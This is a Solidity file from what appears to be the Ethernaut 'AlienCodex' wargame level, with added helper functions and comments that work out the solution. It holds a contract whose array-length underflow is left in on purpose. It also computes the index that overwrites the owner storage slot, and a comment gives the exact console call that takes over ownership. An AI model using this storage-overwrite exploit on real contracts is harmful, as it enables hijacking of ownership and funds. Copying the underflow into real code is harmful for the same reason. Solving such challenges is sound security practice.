// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;


contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        _owner = msg.sender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns true if the caller is the current owner.
     */
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * > Note: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }

  //function to return codex[i]
  function getItem(uint i) contacted public view returns(bytes32) {
    return codex[i];
  }

  //function to return Codex.length
  function getCodexLength() contacted public view returns(uint) {
    return codex.length;
  }

  //function to calculate keccake256(i)
  function getKeccak256(uint i) contacted public view returns (bytes32) {
    return keccak256(abi.encode(i));
  }

  //function to calculate i for underflow
  function calUnderflow() contacted public view returns (uint) {
    uint codex_memory_address = uint(keccak256(abi.encode(1))); //slot 1 memory address => key of codex[0] - slot # for codex[0]
    uint last_slot = 2**256-1; //2^256 - 1 , 32 bytes addresses - 256 bits - max possiblites 2^256, as it starts from 0, it's 2^256-1
    
    uint i= last_slot - codex_memory_address + 1;
    return i;
    //35707666377435648211887908874984608119992236509074197713628505308453184860938
    //await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000001d69DFe5AE027B4912E384B821afeB946592fb648')
  }

}